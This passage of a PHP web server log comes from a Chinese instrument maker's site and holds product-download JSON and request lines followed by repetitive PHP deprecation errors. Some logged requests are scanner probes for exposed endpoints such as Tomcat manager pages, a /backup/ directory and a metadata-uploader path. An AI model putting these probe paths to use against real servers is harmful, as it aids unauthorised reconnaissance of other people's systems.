\u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":268,"title":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":270,"title":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf","agreement":"","drive":"","resource":""},{"id":271,"title":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/88bebf25cc9f75277abfb9945aa00ebc.pdf","agreement":"","drive":"","resource":""},{"id":272,"title":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/4eeb7970b89981df90d0560b8dbe2ff8.pdf","agreement":"","drive":"","resource":""},{"id":290,"title":"\u4ea4\u6d41\u6052\u6d41\u6e90","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":291,"title":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":295,"title":"\u5c0f\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":298,"title":"\u533b\u7528\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eea","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":299,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66763U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":300,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 10kw-15kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":303,"title":"\u5b89\u89c4\u7efc\u5408\u6821\u51c6\u70b9\u68c0\u5de5\u88c5","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":304,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea5KV\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":306,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":307,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":308,"title":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":309,"title":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":311,"title":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":312,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":314,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":315,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/7c63757a23e5e98e594bf1b4bf50445a.pdf","agreement":"","drive":"","resource":""},{"id":316,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":317,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":318,"title":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":319,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/29f9570871ea60e153dce0b05698a13e.pdf","agreement":"","drive":"","resource":""},{"id":320,"title":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/d94e60f7d79a2b3b6d9b106bf787c6db.pdf","agreement":"","drive":"","resource":""},{"id":321,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66764U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":322,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66765U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":323,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667620K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":324,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667640K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":325,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667660K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":326,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 20kw-30kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":327,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 40kw-60kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":328,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 75kw-90kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":329,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-U \u9ad8\u538b\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":330,"title":"\u4ea4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/18ff267d1dc26e503128741d78be61d7.pdf","agreement":"","drive":"","resource":""},{"id":331,"title":"\u4ea4\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/04725819a3c60dff3e1af918dc2ccaf2.pdf","agreement":"","drive":"","resource":""},{"id":332,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/639e5850541f700cdc64053f1d7a18a7.pdf","agreement":"","drive":"","resource":""},{"id":333,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":337,"title":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"title":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T11:21:33+08:00 ] 40.77.167.67 GET www.punalei.cn/ldcms/xiazaizhongxin.html?type=5&name=%E5%BA%94%E7%94%A8%E4%BA%A7%E5%93%81%E8%B5%84%E6%96%99
[ download ] [{"id":262,"name":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":291,"name":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":318,"name":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":337,"name":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"name":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u5e94\u7528\u4ea7\u54c1\u8d44\u6599","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T11:31:03+08:00 ] 135.237.125.143 GET 120.24.147.77/manager/text/list
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:31:03+08:00 ] 135.237.125.143 GET 120.24.147.77/manager/text/list
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:32:24+08:00 ] 20.163.15.218 GET 120.24.147.77/manager/html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:32:24+08:00 ] 20.163.15.218 GET 120.24.147.77/manager/html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:39:02+08:00 ] 52.167.144.19 GET www.punalei.cn/ldcms/qiyexinwen.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined variable $content
[ error ] [2]Trying to access array offset on value of type null
---------------------------------------------------------------
[ 2026-03-18T11:43:26+08:00 ] 204.76.203.18 GET 120.24.147.77/backup/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:43:26+08:00 ] 204.76.203.18 GET 120.24.147.77/backup/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:47:38+08:00 ] 206.168.34.210 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:47:38+08:00 ] 206.168.34.210 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:47:47+08:00 ] 206.168.34.210 GET 120.24.147.77/6csn07ztvizhajlt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T11:47:47+08:00 ] 206.168.34.210 GET 120.24.147.77/6csn07ztvizhajlt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T12:12:12+08:00 ] 52.167.144.150 GET www.punalei.cn/ldcms/dianyuanchanpin.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T12:14:19+08:00 ] 20.64.105.192 GET 120.24.147.77/developmentserver/metadatauploader
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T12:14:19+08:00 ] 20.64.105.192 GET 120.24.147.77/developmentserver/metadatauploader
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T12:38:07+08:00 ] 40.77.167.62 GET www.punalei.cn/ldcms/jueyuandianzuceshiyi.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T12:43:52+08:00 ] 52.167.144.218 GET www.punalei.cn/ldcms/punaleiPNAIdangongnenganguixilie/304.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:04:36+08:00 ] 162.216.150.11 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:17:56+08:00 ] 205.210.31.184 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:20:52+08:00 ] 52.167.144.158 GET www.punalei.cn/ldcms/zhiliudianzifuzai/330.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T13:29:50+08:00 ] 149.86.227.60 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T13:31:26+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
